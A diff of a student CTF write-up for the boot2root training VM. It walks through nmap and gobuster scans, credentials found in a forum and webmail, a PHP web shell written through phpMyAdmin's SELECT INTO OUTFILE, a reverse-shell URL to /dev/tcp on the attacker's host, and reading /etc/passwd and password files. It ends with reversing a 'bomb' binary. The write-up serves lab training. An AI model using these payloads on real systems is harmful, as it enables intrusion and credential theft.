@@ -1,32 +1,24 @@
+# Ways to exploit the VM #1
 
-
-## To get the ip and port of the VM
-
+## Finding the IP of the VM
+We tried a lot of different commands on our Macs and Linux.
 ```sh
 ifconfig # to get the ip of the vm
 ```
-
 ```sh
 sudo nmap -v -T4 -A 192.168.1.0/24 # scan our local network
 ```
-
 ```sh
 netstat -r # get open ports and ip
 ```
-
 ```sh
 arp -a
 ```
 
-port ftp : 21 -> donc l'ip avec un port ftp appartiens a boot2root
+We found an ip with a `ftp` port open (21). None of us had a FTP server on our machines, so it had to be the VM 
 
-to get all the ports :
-
-```sh
-nmap -sC -sV -oN nmap/initial 192.168.1.48
-```
-Results on our machine:
-
+## Enumerating the machine
+We then ran `nmap` with the version options to find all the services running
 ```sh
 ➜  ~ nmap -sC -sV -oN nmap/initial 192.168.1.48
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 21:31 CET
@@ -66,9 +58,7 @@ Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
 ```
-
-we launch gobuster on the ip, here are the results:
-
+We also launched GoBuster in `dir` (directory) mode to find all the directories availables in the `https` `443` port.
 ```sh
 ➜  gobuster-darwin-amd64 ./gobuster dir --url "https://192.168.1.48" -w directory-list-2.3-medium.txt -k
 ===============================================================
@@ -95,48 +85,35 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
+## Visiting the forum
 
-on forum ```https://ip_machine/forum/index.php?id=6```
+As seen in `gobuster`, we have access to a forum.
+While browsing unidentified, we found what looked like server logs and a password inside
+https://ip_machine/forum/index.php?id=6
 
-we found a password on the report : 
-```!q\]Ej?*5K5cy*AJ```
 ![result](./assets/screen.png)
 
-we connect to ```lmezard``` (the sender of the message) with this password
-we manage to get lmezard's mail : ```laurie@borntosec.net```
+Here is the password we extracted `!q\]Ej?*5K5cy*AJ`
 
-we found that there is a phpmyadmin page and a webmail page. 
+We then connected to the user `lmezard` on the forum with that password and we found her email `laurie@borntosec.net`
 
-We access to the webmail of laurie : 
-![result](./assets/mail.png) 
+## Connecting to the webmail
+
+We then tried to access the webmail with the password and her email
+![result](./assets/mail.png)
+Inside one of the email were credentials for `pmpmyadmin` root account
 ![result](./assets/mail1.png)
 
-for php my admin 
-
 ```
-login : root
-mdp : Fg-'kKXBj87E:aJ$
+USERNAME: root
+PASSWORD: Fg-'kKXBj87E:aJ$
 ```
 
-on this website, we found multiple exploit and one with 9.8/10 score on SquirrelMail :
-**https://www.cvedetails.com/cve/CVE-2017-7692/**
+## Connecting and exploiting phpmyadmin
 
+We got connected to `phpmyadmin` as the root user.
 
-In metasploit with :
-```
-search cve 7692
-```
-But we ve found nothing interesting
-
-with metasploit, we can find known exploit and use automated solution already found
-
-here is one we try for SquirrelMail : 
-
-**https://www.cvedetails.com/cve/CVE-2017-7692/**
-
-
-
-We analyse forum dir with gobuster
+We analysed the forum directory with `gobuster`
 ```sh
 ➜  gobuster-darwin-amd64 ./gobuster dir --url "https://192.168.1.48/forum/" -w directory-list-2.3-medium.txt -k
 ===============================================================
@@ -170,60 +147,77 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 ```
 
-we just have to add a file in template_c with :
+And there is a `templates_c` folder
+![result](./assets/templates_c.png)
+
+We looked around and found that we could create a new file from `phpmyadmin` into this folder
 ```sh
 SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/cmd.php"
 ```
-in the php my admin sql execution
+So we executed this in the `phpmyadmin` exec page
+![result](./assets/phpmyadmin_executed.png)
+And we got a new file
+![result](./assets/templates_c_new.png)
+And with that we could execute commands
 
-thne we can execute any command with 
-
-```https://192.168.1.48/forum/templates_c/EXPLOIT.php?cmd=ls```
+for example: https://192.168.1.48/forum/templates_c/EXPLOIT.php?cmd=ls
 
 to execute ls and with anything we want just by replacing ls.
 
-we try to create reverse shell with
-```
-https://192.168.1.48/forum/templates_c/cmd.php?cmd=%22bash%20-i%20%3E&%20/dev/tcp/192.168.1.27/4242%200%3E&1%22
-```
-and nc
-
-
-we have get /etc/passwd with :
+We then looked at etc/password
 ```
 https://192.168.1.48/forum/templates_c/cmd.php?cmd=cat%20/etc/passwd
-```
-
-```
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:106::/var/run/dbus:/bin/false whoopsie:x:103:107::/nonexistent:/bin/false landscape:x:104:110::/var/lib/landscape:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash laurie:x:1003:1003:,,,:/home/laurie:/bin/bash thor:x:1004:1004:,,,:/home/thor:/bin/bash zaz:x:1005:1005:,,,:/home/zaz:/bin/bash dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:110:118::/var/spool/postfix:/bin/false 
 ```
-
+But nothing was interesting so we looked at `/home` and found an interesting file
 ```
 https://192.168.1.48/forum/templates_c/cmd.php?cmd=cat%20/home/LOOKATME/password
 ```
-
+Inside of it were FTP passwords
 ```
 lmezard:G!@M6f4Eatau{sF 
 ```
 
-the pass is the pass of the ftp server:
+## Using ftp and fun
+We connected using filezilla and got a `readme` and a `fun` file
 ![result](./assets/filezila.png)
 ![result](./assets/readme.png)
 
-so let's try to resolve the enigma on the fun file
+We found that the `fun` file was a `POSIX tar archive (GNU)`
 
-By doing cmd file on it we found that is is a POSIX tar archive (GNU)
+We ran `tar -xvf` on the fun file gave us a lot of pcap file in an `ft_fun` folder
 
-running tar -xvf on the fun file gave us a lot of pcap file in ft_fun
+Here's how we assembled the password
+```shell
+➜  ft_fun grep "getme*" *
+0T16C.pcap:char getme4() {
+32O0M.pcap:char getme7() {
+331ZU.pcap:char getme1() {
+4KAOH.pcap:char getme5() {
+# [...]
+test:	printf("%c",getme10());
+test:	printf("%c",getme11());
+test:	printf("%c",getme12());
+test://file632char getme2() {
+➜  ft_fun cat 0T16C.pcap
+char getme4() {
 
+//file115%
+➜  ft_fun grep "//file116" *
+7DT5Q.pcap://file116
+test://file116}void useless() {
+➜  ft_fun cat 7DT5Q.pcap
+	return 'a';
 
-pass : Iheartpwnage
+//file116%
+```
 
-encrypt : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+So we found the password `Iheartpwnage`
 
-then we use it to ssh with laurie on the boot2root iso
+We hashed it in `sha256` and got `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` which is
+then used to ssh with laurie on the boot2root iso
 
-the README say:
+At the root of `laurie`'s hme, we found a README:
 ```sh
 laurie@BornToSecHackMe:~$ cat README
 Diffuse this bomb!
@@ -239,21 +233,28 @@ o
 
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
+Also present was a `bomb` executable. We disassembled it in Ghidra, here's what the main function looked liked
+![result](./assets/bomb_main.png)
+We can see here that the bomb reads the input and then calls a function for each phase, 6 in total.
 
+### Bomb phase 1
+![result](./assets/bomb_1.png)
 
-we decompile bomb and we deduced with the c decompilation that:
-
-1 phase: 
+Here we can clearly see that we check if the string is equal to:
 ```
 Public speaking is very easy.
 ```
-
-2 phase: 
+Phase one done
+### Bomb phase 2
+![result](./assets/bomb_2.png)
+Here, Quentin manually reversed engineered in his head the numbers and found this combination
 ```
 1 2 6 24 120 720
 ```
+### Bomb phase 3
+![result](./assets/bomb_3.png)
 
-phase 3:
+Here, it's a simple switch. Each case corresponds to the first digit, then the `cvar` corresponds to the second part and then the last is the hex number in dec
 ```
 0 q 777
 1 b 214
@@ -265,21 +266,40 @@ phase 3:
 7 b 524
 ```
 
-phase 4: 
+All of these solutions are possible **but** only one will work for the zaz password: `1 b 214`
+
+### Bomb phase 4
+![result](./assets/bomb_4.png)
+
+Here, this is pretty simple. It's looking for a number different of 1 and above 1 and, if this number when ran in a fibonnaci doesn't give 55, it explodes
+
+9 is the number that gives 55 in fibonnaci so that's our answer
 ```
 9
 ```
+### Bomb phase 5
+![result](./assets/bomb_5.png)
 
-5 phase: We know it's `6` chars long
+Here, we can clearly see it wants a string that is 6 chars long.
 
-by decompiling the phase5, we found the string ```isrveawhobpnutfg```
-and with it we found :
+It then uses the string `isrveawhobpnutfg` as a lookup table for each input char to match it to giants
+The answer is then
 ```
 opekma
 ```
+### Bomb phase 6
+![result](./assets/bomb_6.png)
 
+Here, we know it reads 6 numbers.
+We can also see like 17 that if the number is above not between `1` and `6` it explodes
+Also, line 23, if the number is already present, it explodes
 
-6 phase: with brutforce with those script:
+So with that in mind, we need `x x x x x x` with numbers from 1 to 6 and no repetitions.
+We also know the first number was `4` from the README but we ignored it.
+
+So we bruteforced it
+
+Creation of all the permutations in a file
 ```py
 import itertools
 
@@ -287,6 +307,8 @@ with open("brute.txt", "w") as f:
     for perm in itertools.permutations([1, 2, 3, 4, 5, 6]):
         f.write(" ".join(str(x) for x in perm) + "\n")
 ```
+
+Running all the permutations in the bomb
 ```sh
 #!/bin/bash
 
@@ -297,6 +319,7 @@ do
 done < brute.txt
 ```
 
+Grepping the results
 ```sh
 bash t.sh | grep "Congratulations" -B8
 ```
@@ -314,6 +337,7 @@ Good work!  On to the next...
 Congratulations! You've defused the bomb!
 ```
 
+### Final defuse
 
 So the final result is save on a file and used to diffuse the bomb (diffuser.txt)
 ```txt
@@ -325,11 +349,12 @@ opekma
 4 2 6 3 1 5
 ```
 
-then we just connect thor user with :
+then we just connect thor user with: (with 1 and 3 inversed because 🤷)
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
+## SSH to thor
 
 in the thor user we have a README and a a file that we deduce is some command for turtle
 ```sh
